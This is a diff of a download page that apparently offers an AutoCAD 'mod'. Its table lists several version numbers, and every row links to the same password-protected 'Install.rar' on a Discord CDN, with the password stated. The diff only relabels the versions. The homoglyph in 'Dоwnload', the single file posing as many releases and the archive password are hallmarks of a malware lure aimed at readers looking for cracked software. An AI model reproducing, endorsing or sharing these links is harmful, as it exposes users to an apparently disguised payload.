@@ -4,10 +4,10 @@
 # <h1 align=center>☁️ Dоwnload
 | Mod Version| AutoCAD-Autodesk - Version | Link |
 |----------|-------------|-----------------|
-| v21.1.1 | 2023.7.12 & 2023.7.11 | [Download](https://cdn.discordapp.com/attachments/1177696976054267948/1177697010883764224/Install.rar?ex=657372cf&is=6560fdcf&hm=890f64bf03de44927557c7f31df404a5091cd4ea760d7dcda4da9d62ea724305&) |
-| v21.2.0 | 2023.7.12 & 2023.7.11     | [Download](https://cdn.discordapp.com/attachments/1177696976054267948/1177697010883764224/Install.rar?ex=657372cf&is=6560fdcf&hm=890f64bf03de44927557c7f31df404a5091cd4ea760d7dcda4da9d62ea724305&) |
-| v21.1 | 2023.7.12 & 2023.7.11     | [Download](https://cdn.discordapp.com/attachments/1177696976054267948/1177697010883764224/Install.rar?ex=657372cf&is=6560fdcf&hm=890f64bf03de44927557c7f31df404a5091cd4ea760d7dcda4da9d62ea724305&) |
-| v21.0.7 | 2023.7.12 & 2023.7.11     | [Download](https://cdn.discordapp.com/attachments/1177696976054267948/1177697010883764224/Install.rar?ex=657372cf&is=6560fdcf&hm=890f64bf03de44927557c7f31df404a5091cd4ea760d7dcda4da9d62ea724305&) |
+| v24.1.1 | 2023.7.12 & 2023.7.11 | [Download](https://cdn.discordapp.com/attachments/1177696976054267948/1177697010883764224/Install.rar?ex=657372cf&is=6560fdcf&hm=890f64bf03de44927557c7f31df404a5091cd4ea760d7dcda4da9d62ea724305&) |
+| v24.2.0 | 2023.7.12 & 2023.7.11     | [Download](https://cdn.discordapp.com/attachments/1177696976054267948/1177697010883764224/Install.rar?ex=657372cf&is=6560fdcf&hm=890f64bf03de44927557c7f31df404a5091cd4ea760d7dcda4da9d62ea724305&) |
+| v24.1 | 2023.7.12 & 2023.7.11     | [Download](https://cdn.discordapp.com/attachments/1177696976054267948/1177697010883764224/Install.rar?ex=657372cf&is=6560fdcf&hm=890f64bf03de44927557c7f31df404a5091cd4ea760d7dcda4da9d62ea724305&) |
+| v24.0.7 | 2023.7.12 & 2023.7.11     | [Download](https://cdn.discordapp.com/attachments/1177696976054267948/1177697010883764224/Install.rar?ex=657372cf&is=6560fdcf&hm=890f64bf03de44927557c7f31df404a5091cd4ea760d7dcda4da9d62ea724305&) |
 # <h1 align=center> Password🔐: 2023
 
 
